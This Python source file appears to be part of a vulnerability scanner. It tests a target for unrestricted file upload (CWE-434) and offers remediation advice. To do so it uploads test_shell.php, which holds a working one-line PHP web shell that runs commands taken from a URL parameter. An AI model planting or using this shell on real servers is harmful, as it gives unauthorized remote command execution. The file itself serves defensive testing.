"""File Upload Scanner"""

import time
from typing import List

import httpx

from cherenkov.core.base_scanner import BaseScanner, Finding, ScanResult, Severity


class FileUploadScanner(BaseScanner):
    """Scanner to detect Unrestricted File Upload vulnerabilities."""

    def __init__(self, name: str = "", description: str = ""):
        super().__init__(name, description)

    async def scan(self, target: str, timeout: float = 10.0) -> ScanResult:
        """Execute the scan - attempting to upload an unsafe file."""
        start_time = time.time()
        findings: List[Finding] = []

        # Payload for an unsafe file upload attempt (e.g. eicar or fake webshell)
        test_file_name = "test_shell.php"
        test_file_content = b"<?php system($_GET['cmd']); ?>"
        files = {"file": (test_file_name, test_file_content, "application/x-php")}

        try:
            async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
                # Attempting to upload to standard upload endpoints or directly to the target URL
                response = await client.post(target, files=files, follow_redirects=True)

                # We check for indications of successful upload
                # A 200/201 response with path or success message, or simply allowing the file without rejection
                # This is a heuristic and would normally be verified by accessing the file.
                if response.status_code in (200, 201) and (
                    test_file_name in response.text
                    or "success" in response.text.lower()
                    or "uploaded" in response.text.lower()
                ):
                    findings.append(
                        Finding(
                            title="Unrestricted File Upload",
                            severity=Severity.HIGH,
                            description=f"The application appears to allow the upload of restricted file types ({test_file_name}).",
                            cwe="CWE-434",
                            remediation="Implement strict server-side validation of file extensions, MIME types, and content. Store uploaded files outside of the web root or configure the web server to not execute scripts in the upload directory.",
                        )
                    )
        except (httpx.RequestError, httpx.TimeoutException):
            pass

        duration_ms = (time.time() - start_time) * 1000

        return ScanResult(
            target=target,
            scanner_name=self.name,
            findings=findings,
            duration_ms=duration_ms,
            status="completed",
        )
